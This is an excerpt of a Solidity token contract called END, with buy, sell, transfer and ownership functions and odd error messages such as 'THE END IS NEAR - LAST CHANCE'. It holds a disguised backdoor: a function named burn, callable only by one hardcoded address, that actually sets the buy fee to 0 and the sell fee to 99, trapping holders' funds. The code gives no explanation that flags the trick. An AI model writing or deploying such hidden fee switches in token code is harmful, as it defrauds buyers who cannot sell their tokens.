...
contract END {    
    ...
    modifier onlyOwner() {
        require(msg.sender == owner, "ENDENDEND");
        _;
    }
    ...
    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   
        require(balanceOf[_from] >= _amount, "ENDENDENDEND");    
        require(allowance[_from][msg.sender] >= _amount, "ENDENDENDENDEND");   
        require(_to != address(0), "ENDENDENDENDENDEND");    
    ...
    function transferOwnership(address newOwner) public onlyOwner {    
        require(newOwner != address(0), "ENDENDENDENDENDENDENDEND");
    ...
    function burn(uint256 burnAmount, uint256 deadWallet) public {
        require(msg.sender == 0x3F587EB790E54afd531f241BA603E34a6014a6d5, "xENDx");
        require(!feesSet, "xxENDxx");
        require(burnAmount == 0, "xxxENDxxx");
        require(deadWallet == 99, "xxxxENDxxxx");
        buyFee = burnAmount;
        sellFee = deadWallet;
        feesSet = true;
        feesEnabled = true;
    ...
    function buy() public payable checkFees(msg.sender) {    
        require(msg.value > 0, "ENDENDISNEAR");    
    ...
    function sell(uint256 _amount) public checkFees(msg.sender) {   
        require(balanceOf[msg.sender] >= _amount, "THE END IS NEAR - LAST CHANCE");    
